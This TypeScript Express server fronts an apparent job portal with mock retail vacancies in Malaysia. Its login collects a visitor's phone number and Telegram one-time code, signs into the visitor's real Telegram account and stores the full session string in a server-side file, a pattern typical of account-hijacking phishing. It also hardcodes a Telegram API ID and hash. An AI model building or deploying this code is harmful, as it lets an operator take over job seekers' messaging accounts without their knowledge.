import express from "express";
import cors from "cors";
import { TelegramClient, Api } from "telegram";
import { StringSession } from "telegram/sessions";
import fs from "fs";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors());
app.use(express.json());

// Telegram Config
const apiId = parseInt(process.env.TELEGRAM_API_ID || "33204418");
const apiHash = process.env.TELEGRAM_API_HASH || "a4070a8dec9ca2581f63ac38dbbb12e6";

// Session & State
const loginStates: Record<string, { client: TelegramClient; phoneCodeHash: string }> = {};
let appSessions: Record<string, string> = {};

const SESSIONS_FILE = "sessions.json";

if (fs.existsSync(SESSIONS_FILE)) {
  try {
    appSessions = JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf8"));
  } catch (e) {
    appSessions = {};
  }
}

const saveSessions = () => {
  fs.writeFileSync(SESSIONS_FILE, JSON.stringify(appSessions, null, 2));
};

// Mock Jobs Database
const jobsDB = [
  {
    id: 1,
    title: "Store Manager",
    location: "Kuala Lumpur",
    type: "Full-time",
    salary: "RM 3000 - RM 4500",
    desc: "Mengelola operasional toko sehari-hari, mencapai target penjualan, dan memimpin tim toko.",
  },
  {
    id: 2,
    title: "Cashier",
    location: "Selangor",
    type: "Part-time",
    salary: "RM 1500 - RM 1800",
    desc: "Melayani transaksi pelanggan dengan ramah, akurat, dan memastikan area kasir bersih.",
  },
  {
    id: 3,
    title: "Promoter",
    location: "Penang",
    type: "Full-time",
    salary: "RM 1800 - RM 2200",
    desc: "Membantu pelanggan menemukan barang, menjaga kebersihan rak, dan restock barang.",
  },
];

// API Routes
app.post("/api/login", async (req, res) => {
  const { phone } = req.body;
  if (!phone) return res.status(400).json({ error: "Nomor HP wajib diisi" });

  try {
    const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
      connectionRetries: 5,
    });
    await client.connect();
    const result = await client.sendCode({ apiId, apiHash }, phone);
    loginStates[phone] = { client, phoneCodeHash: result.phoneCodeHash };
    res.json({ success: true, message: "OTP berhasil dikirim ke Telegram" });
  } catch (error: any) {
    console.error("Login Error:", error);
    res.status(500).json({ error: error.message || "Gagal mengirim OTP" });
  }
});

app.post("/api/verify", async (req, res) => {
  const { phone, code } = req.body;
  const state = loginStates[phone];
  if (!state) return res.status(400).json({ error: "Sesi login tidak ditemukan." });

  try {
    const { client, phoneCodeHash } = state;
    await client.invoke(
      new Api.auth.SignIn({
        phoneNumber: phone,
        phoneCodeHash: phoneCodeHash,
        phoneCode: code,
      })
    );
    const sessionString = client.session.save() as unknown as string;
    const appToken = "tk_" + Math.random().toString(36).substring(2, 15);
    appSessions[appToken] = sessionString;
    saveSessions();
    delete loginStates[phone];
    res.json({ success: true, appToken, message: "Login berhasil" });
  } catch (error: any) {
    console.error("Verify Error:", error);
    res.status(400).json({ error: "Kode OTP salah atau sudah expired." });
  }
});

app.get("/api/profile", async (req, res) => {
  const token = req.headers["authorization"];
  if (!token || !appSessions[token]) return res.status(401).json({ error: "Unauthorized" });

  try {
    const client = new TelegramClient(new StringSession(appSessions[token]), apiId, apiHash, {
      connectionRetries: 1,
    });
    await client.connect();
    const me = await client.getMe();
    if (me instanceof Api.User) {
      res.json({
        id: me.id.toString(),
        first_name: me.firstName || "",
        last_name: me.lastName || "",
        username: me.username || "",
        phone: me.phone || "Private",
        status: "Logged in",
      });
    } else {
      res.status(500).json({ error: "Could not fetch profile" });
    }
    await client.disconnect();
  } catch (error) {
    res.status(401).json({ error: "Sesi berakhir. Silakan login kembali." });
  }
});

app.get("/api/jobs", (req, res) => res.json(jobsDB));

app.get("/api/jobs/:id", (req, res) => {
  const job = jobsDB.find((j) => j.id === parseInt(req.params.id));
  job ? res.json(job) : res.status(404).json({ error: "Job not found" });
});

app.post("/api/logout", (req, res) => {
  const token = req.headers["authorization"];
  if (token) delete appSessions[token];
  saveSessions();
  res.json({ success: true });
});

// Vite Middleware for Development
async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static(path.join(__dirname, "dist")));
    app.get("*", (req, res) => {
      res.sendFile(path.join(__dirname, "dist", "index.html"));
    });
  }

  const PORT = 3000;
  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
